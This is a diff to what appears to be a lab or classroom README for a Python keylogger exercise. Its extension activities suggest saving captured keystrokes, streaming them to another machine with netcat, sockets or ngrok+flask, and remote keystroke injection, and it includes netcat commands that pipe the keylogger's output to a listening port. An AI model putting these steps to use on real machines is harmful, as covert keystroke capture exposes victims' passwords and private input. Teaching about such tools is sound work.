@@ -18,7 +18,7 @@ python simple_keylogger.py
 
 ## Extension Activities
 ### Modify simple_keylogger.py
-* Save the output to file.  See 'use as standalone module' in github repo linked below.
+* Save the output to file.  
 * Stream output remotely or schedule data dumps 
   * Try using sockets or ngrok+flask
 
@@ -27,7 +27,7 @@ python simple_keylogger.py
 * Try streaming the output with netcat.
   * Server, Keylogger (ex: 10.2.0.5):
   ```
-  python3 simple_keylogger.py | nc -lkv 7777
+  python simple_keylogger.py | nc -lkv 7777
   python -m keyboard | nc -lkv 7778
   ```
   * Client (ex: 10.2.0.6; or, use a browser):
@@ -35,7 +35,8 @@ python simple_keylogger.py
   nc -zv 10.2.0.5 7777
   nc -zv 10.2.0.5 7778
   ```
-Note:  Remote keyboard injection is also possible with the keyboard module.
+* Remote keyboard injection is also possible with the keyboard module.
+* The keyboard module can also be used as a standalone python module (i.e., python -m keyboard).
 
 ### On Linux, explore the /dev/input folder.  
 Try:
